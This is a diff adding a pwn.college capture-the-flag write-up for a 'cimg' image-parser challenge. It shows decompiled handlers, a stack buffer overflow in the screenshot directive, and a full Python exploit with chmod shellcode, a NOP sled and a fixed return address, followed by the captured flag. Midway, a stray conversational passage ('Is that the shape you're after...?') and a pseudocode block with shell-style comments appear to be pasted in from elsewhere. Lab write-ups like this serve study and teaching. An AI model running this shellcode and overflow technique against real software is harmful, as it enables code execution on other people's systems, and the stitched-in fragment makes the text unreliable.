@@ -1927,3 +1927,486 @@ $
 hacker@integrated-security~ecb-to-shellcode-hard:~$ cat /flag
 pwn.college{wmHupm0Wp3hQROeesdi06fN4QYC.QXwYDMxEDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## CIMG Screenshots 
+
+### Binary Analysis
+
+```
+hacker@integrated-security~integration-cimg-screenshot-sc:~$ checksec /challenge/integration-cimg-screenshot-sc
+[*] '/challenge/integration-cimg-screenshot-sc'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+The binary processes a custom `.cimg` image format. It begins with a 12-byte header:
+
+```
+Offset  Size  Field
+------  ----  -----
+0       4     Magic: "cIMG"
+4       2     Version (little-endian)
+6       1     Canvas width
+7       1     Canvas height
+8       4     Directive count (little-endian)
+```
+
+After the header, the binary reads and dispatches that many directives. Each directive starts with a 2-byte opcode that selects one of eight handlers.
+
+```c title="/challenge/integration-cimg-screenshot-sc :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rcx
+  int *v5; // rdi
+  const char *v6; // r12
+  int v7; // eax
+  const char *v8; // rdi
+  __int64 v10; // rdx
+  unsigned __int16 v12; // [rsp+6h] [rbp-1032h] BYREF
+  int v13; // [rsp+8h] [rbp-1030h] BYREF
+  __int16 v14; // [rsp+Ch] [rbp-102Ch]
+  int v15; // [rsp+10h] [rbp-1028h]
+
+  v3 = 1030;
+  v5 = &v13;
+  while ( v3 )
+  {
+    *v5++ = 0;
+    --v3;
+  }
+  if ( argc > 1 )
+  {
+    v6 = argv[1];
+    if ( strcmp(&v6[strlen(v6) - 5], ".cimg") )
+    {
+      __printf_chk(1, "ERROR: file has incorrect extension");
+      goto LABEL_11;
+    }
+    v7 = open(v6, 0);
+    dup2(v7, 0);
+  }
+  read_exact(0, &v13, 12, "ERROR: Failed to read cimg header!", 0xFFFFFFFFLL);
+  if ( v13 != 1196247395 )
+  {
+    v8 = "ERROR: Invalid magic number!";
+LABEL_10:
+    puts(v8);
+    goto LABEL_11;
+  }
+  v8 = "ERROR: Unsupported version!";
+  if ( v14 != 4 )
+    goto LABEL_10;
+  initialize_framebuffer(&v13);
+  while ( v15-- )
+  {
+    read_exact(0, &v12, 2, "ERROR: Failed to read &directive_code!", 0xFFFFFFFFLL);
+    if ( v12 > 7u )
+    {
+      if ( v12 != 1337 )
+      {
+LABEL_26:
+        __fprintf_chk(stderr, 1, "ERROR: invalid directive_code %ux\n", v12);
+LABEL_11:
+        exit(-1);
+      }
+      handle_1337(&v13);
+    }
+    else
+    {
+      if ( !v12 )
+        goto LABEL_26;
+      switch ( v12 )
+      {
+        case 2u:
+          handle_2((__int64)&v13);
+          break;
+        case 3u:
+          handle_3(&v13);
+          break;
+        case 4u:
+          handle_4(&v13);
+          break;
+        case 5u:
+          handle_5(&v13);
+          break;
+        case 6u:
+          handle_6(&v13);
+          break;
+        case 7u:
+          handle_7(&v13);
+          break;
+        default:
+          handle_1(&v13, &v12, v10, (unsigned int)v12 - 2);
+          break;
+      }
+    }
+  }
+  display(&v13, 0);
+  return 0;
+}
+```
+
+The relevant handlers are:
+
+**handle_5()**: loads a sprite from a file. It reads 258 bytes from the `.cimg` stream: `[sprite_id, width, height, path...]`. It opens the file at `path`, allocates `width × height` bytes, and reads the raw file contents in. The only validation is a `strncmp` that rejects files whose contents start with `"pwn.college{"`.
+
+```c title="/challenge/integration-cimg-screenshot-sc :: handle_5() :: Pseudocode" showLineNumbers
+int __fastcall handle_5(__int64 a1)
+{
+  __int16 v2; // dx
+  int v3; // eax
+  FILE *v4; // rsi
+  const char *v5; // rdi
+  unsigned int v6; // ebp
+  void *v7; // rdi
+  int v8; // r13d
+  const char *v9; // rax
+  const char *v10; // rbx
+  _BYTE v12[299]; // [rsp+Dh] [rbp-12Bh] BYREF
+
+  memset(v12, 0, 0x103u);
+  read_exact(0, v12, 258, "ERROR: Failed to read &sprite_load_record!", 0xFFFFFFFFLL);
+  LOBYTE(v2) = v12[2];
+  HIBYTE(v2) = v12[1];
+  *(_WORD *)(a1 + 16LL * v12[0] + 24) = v2;
+  v3 = open(&v12[3], 0);
+  v4 = stderr;
+  v5 = "ERROR: failed to open sprite file\n";
+  if ( v3 < 0 )
+    goto LABEL_9;
+  v6 = v3;
+  v7 = *(void **)(16LL * v12[0] + a1 + 32);
+  if ( v7 )
+    free(v7);
+  v8 = v12[2] * v12[1];
+  v9 = (const char *)malloc(v8);
+  v10 = v9;
+  if ( !v9 )
+  {
+    puts("ERROR: Failed to allocate memory for the image data!");
+    goto LABEL_6;
+  }
+  read_exact(v6, v9, (unsigned int)v8, "ERROR: Failed to read data!", 0xFFFFFFFFLL);
+  if ( !strncmp(v10, "pwn.college{", 0xCu) )
+  {
+    v4 = stderr;
+    v5 = "ERROR: shenanigans detected!!!!!";
+LABEL_9:
+    fputs(v5, v4);
+LABEL_6:
+    exit(-1);
+  }
+  *(_QWORD *)(16LL * v12[0] + a1 + 32) = v10;
+  return close(v6);
+}
+```
+
+**handle_4()**: renders a sprite onto the canvas. It reads 9 parameter bytes: `[sprite_id, R, G, B, src_x, src_y, dest_w, dest_h, transparency_key]`. The canvas stores each pixel as a 24-byte ANSI escape sequence `\x1b[38;2;RRR;GGG;BBMc\x1b[0m`, where the character `c` is at byte offset 19. handle_4 writes each sprite byte directly into the `c` position of the corresponding pixel — **no printable-ASCII validation**, unlike handle_2 and handle_3. Pixels whose sprite byte equals `transparency_key` are skipped.
+
+```c title="/challenge/integration-cimg-screenshot-sc :: handle_4() :: Pseudocode" showLineNumbers
+// positive sp value has been detected, the output may be wrong!
+__int64 __fastcall handle_4(__int64 a1)
+{
+  _DWORD *v2; // rdi
+  __int64 v3; // rcx
+  __int64 v4; // rdx
+  char v5; // r10
+  char v6; // r11
+  char v7; // bp
+  __int64 v8; // rdx
+  int v9; // r12d
+  int v10; // r8d
+  int v11; // edi
+  __int64 v12; // rax
+  __int64 v13; // r9
+  int i; // r15d
+  __int64 result; // rax
+  int j; // r10d
+  int v17; // r11d
+  __int64 v18; // rdx
+  int v19; // r12d
+  int v20; // ebp
+  int k; // r13d
+  int v22; // eax
+  __int64 v23; // rax
+  __int64 v24; // rdx
+  int v25; // r14d
+  __int64 v26; // rdx
+  __int64 v27; // rdx
+  int v28; // [rsp-40h] [rbp-40070h]
+  int v29; // [rsp-3Ch] [rbp-4006Ch]
+  _BYTE v30[7]; // [rsp-2Ah] [rbp-4005Ah] BYREF
+  unsigned __int8 v31; // [rsp-23h] [rbp-40053h]
+  char v32; // [rsp-22h] [rbp-40052h]
+  __int128 v33; // [rsp-21h] [rbp-40051h] BYREF
+  __int64 v34; // [rsp-11h] [rbp-40041h]
+  _BYTE v35[8]; // [rsp-8h] [rbp-40038h] BYREF
+  char v36; // [rsp+0h] [rbp-40030h] BYREF
+  __int64 v37; // [rsp+1000h] [rbp-3F030h] BYREF
+
+  while ( &v36 != (char *)(&v37 - 0x8000) )
+    ;
+  read_exact(0, v30, 9, "ERROR: Failed to read &sprite_render_record!", 0xFFFFFFFFLL);
+  v2 = v35;
+  v3 = 0x10000;
+  v4 = v30[0];
+  v5 = v30[1];
+  while ( v3 )
+  {
+    *v2++ = 0;
+    --v3;
+  }
+  v6 = v30[2];
+  v7 = v30[3];
+  v8 = a1 + 16 * v4;
+  v9 = *(unsigned __int8 *)(v8 + 24);
+  while ( v9 > (int)v3 )
+  {
+    v10 = *(unsigned __int8 *)(v8 + 25);
+    v11 = 0;
+    v12 = (unsigned int)(v3 * v10);
+    while ( v10 > v11 )
+    {
+      v13 = *(_QWORD *)(v8 + 32);
+      v35[4 * v12] = v5;
+      v35[4 * v12 + 1] = v6;
+      v35[4 * v12 + 2] = v7;
+      if ( !v13 )
+      {
+        fputs("ERROR: attempted to render uninitialized sprite!\n", stderr);
+        exit(-1);
+      }
+      ++v11;
+      v35[4 * v12 + 3] = *(_BYTE *)(v13 + v12);
+      ++v12;
+    }
+    LODWORD(v3) = v3 + 1;
+  }
+  for ( i = 0; ; ++i )
+  {
+    result = v31;
+    if ( v31 <= i )
+      break;
+    for ( j = 0; v30[6] > j; ++j )
+    {
+      v17 = 0;
+      v18 = a1 + 16LL * v30[0];
+      v19 = (unsigned __int8)(v30[4] + j * *(_BYTE *)(v18 + 25));
+      v20 = (unsigned __int8)(v30[5] + i * *(_BYTE *)(v18 + 24));
+      while ( *(unsigned __int8 *)(16LL * v30[0] + a1 + 24) > v17 )
+      {
+        for ( k = 0; ; ++k )
+        {
+          v22 = *(unsigned __int8 *)(16LL * v30[0] + a1 + 25);
+          if ( v22 <= k )
+            break;
+          v23 = k + v17 * v22;
+          v24 = (unsigned __int8)v35[4 * v23 + 3];
+          if ( (_BYTE)v24 != v32 )
+          {
+            v29 = v17;
+            v25 = *(unsigned __int8 *)(a1 + 6);
+            v28 = j;
+            __snprintf_chk(
+              &v33,
+              25,
+              1,
+              25,
+              "\x1B[38;2;%03d;%03d;%03dm%c\x1B[0m",
+              (unsigned __int8)v35[4 * v23],
+              (unsigned __int8)v35[4 * v23 + 1],
+              (unsigned __int8)v35[4 * v23 + 2],
+              v24);
+            v17 = v29;
+            j = v28;
+            v26 = (unsigned int)((k + v19) % v25);
+            LODWORD(v26) = (unsigned int)(v26 + v20 * v25) % *(_DWORD *)(a1 + 12);
+            v27 = *(_QWORD *)(a1 + 16) + 24 * v26;
+            *(_OWORD *)v27 = v33;
+            *(_QWORD *)(v27 + 16) = v34;
+          }
+        }
+        ++v17;
+        ++v20;
+      }
+    }
+  }
+  return result;
+}
+```
+
+**handle_1337()**: screenshots a rectangular region of the canvas. It reads 5 parameter bytes: `[dest_sprite_id, src_x, src_y, width, height]`. It then iterates over `width × height` canvas pixels, extracting the character byte at offset 19 of each pixel's ANSI string, and stores it into a local output buffer:
+
+```c title="/challenge/integration-cimg-screenshot-sc :: handle_1337() :: Pseudocode" showLineNumbers
+__int16 __fastcall handle_1337(__int64 a1)
+{
+  int v2; // r12d
+  _BYTE *v3; // rdi
+  int v4; // esi
+  int v5; // r13d
+  int v6; // r11d
+  int v7; // r10d
+  __int64 v8; // r8
+  __int64 i; // rcx
+  void *v10; // rdi
+  __int16 result; // ax
+  __int64 v12; // rbx
+  _BYTE v13[3]; // [rsp+Bh] [rbp-ADh] BYREF
+  unsigned __int8 v14; // [rsp+Eh] [rbp-AAh]
+  unsigned __int8 v15; // [rsp+Fh] [rbp-A9h]
+  _BYTE v16[168]; // [rsp+10h] [rbp-A8h] BYREF
+
+  read_exact(0, v13, 5, "ERROR: Failed to read &sprite_screenshot_record!", 0xFFFFFFFFLL);
+  v2 = v14;
+  v3 = v16;
+  v4 = 0;
+  v5 = v15;
+  v6 = v13[1];
+  v7 = v13[2];
+  v8 = v14;
+  while ( v5 > v4 )
+  {
+    for ( i = 0; v2 > (int)i; ++i )
+      v3[i] = *(_BYTE *)(*(_QWORD *)(a1 + 16)
+                       + 24LL
+                       * (((unsigned int)i + v6 + (v7 + v4) * *(unsigned __int8 *)(a1 + 6)) % *(_DWORD *)(a1 + 12))
+                       + 19);
+    ++v4;
+    v3 += v8;
+  }
+  v10 = *(void **)(16LL * v13[0] + a1 + 32);
+  if ( v10 )
+    free(v10);
+  LOBYTE(result) = v15;
+  HIBYTE(result) = v14;
+  v12 = 16LL * v13[0] + a1;
+  *(_QWORD *)(v12 + 32) = v16;
+  *(_WORD *)(v12 + 24) = result;
+  return result;
+}
+```
+
+So replace the asm block with the full `handle_1337` pseudocode that's already shown earlier in the document — just reusing it in place of the asm block for the explanation section. Like this:
+
+```c title="/challenge/integration-cimg-screenshot-sc :: handle_1337() :: Pseudocode" showLineNumbers
+__int16 __fastcall handle_1337(__int64 a1)
+{
+
+  # ---- snip ----
+
+  _BYTE v16[168]; // [rsp+10h] [rbp-A8h] BYREF
+  
+  # ---- snip ----
+
+  read_exact(0, v13, 5, "ERROR: Failed to read &sprite_screenshot_record!", 0xFFFFFFFFLL);
+
+  # ---- snip ----
+
+  while ( v5 > v4 )
+  {
+    for ( i = 0; v2 > (int)i; ++i )
+      v3[i] = *(_BYTE *)(*(_QWORD *)(a1 + 16)
+                       + 24LL * (...)
+                       + 19);
+    
+    # ---- snip ----
+
+  }
+  
+  # ---- snip ----
+
+}
+```
+
+The output buffer `v16` is at `rsp+0x10`, and the return address sits at `rsp+0xb8`, a distance of **168 bytes** from the start of the buffer. There is **no bounds check** on `width × height`, so supplying a region wider than 168 pixels overwrites the saved return address, a classic stack buffer overflow.
+
+Is that the shape you're after, or did you want it verbatim (no ellipses)?
+
+The binary also disables ASLR by re-executing itself with `ADDR_NO_RANDOMIZE`, and the stack has no canary, making the overflow trivially exploitable.
+
+### Exploit
+
+The exploit chain is:
+
+1. **handle_5** loads arbitrary bytes from `/tmp/exploit.bin` into sprite slot 0. Because it reads a binary file with no ASCII check, this can carry shellcode.
+2. **handle_4** renders sprite 0 onto the canvas. Each byte of the sprite becomes the character position of a canvas pixel. This smuggles non-printable shellcode bytes into the framebuffer.
+3. **handle_1337** screenshots a `176 × 1` region into the output buffer on the stack. `176 > 168`, so the last 8 bytes overwrite the saved return address.
+
+The payload in `exploit.bin` is:
+- 132 NOP bytes (sled to the shellcode)
+- 36 bytes of PIC chmod shellcode
+- 8-byte return address pointing to the start of the output buffer (confirmed at `0x7fffffffda00`)
+
+The shellcode constructs `/flag` on the stack by pushing an immediate, calls `chmod("/flag", 0o777)`, then exits:
+
+```python title="~/exploit.py" showLineNumbers
+#!/usr/bin/env python3
+import struct, subprocess
+
+CANVAS_W = 200
+CANVAS_H = 1
+DIRECTIVES = 3
+
+nops = b"\x90" * 132
+
+sc  = b"\x31\xc0"                                   # xor eax, eax
+sc += b"\x50"                                        # push rax  (null terminator)
+sc += b"\x48\xb8\x2f\x66\x6c\x61\x67\x00\x00\x00"  # mov rax, "/flag\0\0\0"
+sc += b"\x50"                                        # push rax
+sc += b"\x48\x89\xe7"                               # mov rdi, rsp  -> "/flag"
+sc += b"\x31\xc0"                                   # xor eax, eax
+sc += b"\xb0\x5a"                                   # mov al, 90  (SYS_chmod)
+sc += b"\xbe\xff\x01\x00\x00"                       # mov esi, 0x1ff  (0o777)
+sc += b"\x0f\x05"                                   # syscall
+sc += b"\x31\xff"                                   # xor edi, edi
+sc += b"\x31\xc0"                                   # xor eax, eax
+sc += b"\xb0\x3c"                                   # mov al, 60  (SYS_exit)
+sc += b"\x0f\x05"                                   # syscall
+
+assert len(sc) == 36
+
+# Return address: start of handle_1337's output buffer (ASLR disabled)
+ret_addr = struct.pack("<Q", 0x7fffffffda00)
+payload = nops + sc + ret_addr
+assert len(payload) == 176
+
+with open("/tmp/exploit.bin", "wb") as f:
+    f.write(payload)
+
+# Build the .cimg file
+hdr = b"cIMG" + struct.pack("<H", 4) + bytes([CANVAS_W, CANVAS_H]) + struct.pack("<I", DIRECTIVES)
+
+# Directive 1: handle_5 — load exploit.bin as sprite 0 (176x1)
+path = b"/tmp/exploit.bin\x00"
+record5 = bytes([0, 176, 1]) + path
+record5 = record5.ljust(258, b"\x00")
+d5 = struct.pack("<H", 0x0005) + record5
+
+# Directive 2: handle_4 — render sprite 0 to canvas at (0,0), transparency=0xce
+d4 = struct.pack("<H", 0x0004) + bytes([0, 0, 0, 0, 0, 0, 1, 1, 0xce])
+
+# Directive 3: handle_1337 — screenshot 176x1 region into sprite 1 -> stack overflow
+d1337 = struct.pack("<H", 0x0539) + bytes([1, 0, 0, 176, 1])
+
+cimg = hdr + d5 + d4 + d1337
+with open("/tmp/exploit.cimg", "wb") as f:
+    f.write(cimg)
+
+subprocess.run(["/challenge/integration-cimg-screenshot-sc", "/tmp/exploit.cimg"])
+```
+
+```
+hacker@integrated-security~integration-cimg-screenshot-sc:~$ python3 ~/exploit.py
+hacker@integrated-security~integration-cimg-screenshot-sc:~$ cat /flag
+pwn.college{sQ1MyWTyt3UmOI91I2-7M6WXHRl.QXxYDMxEDL4ITM0EzW}
+```
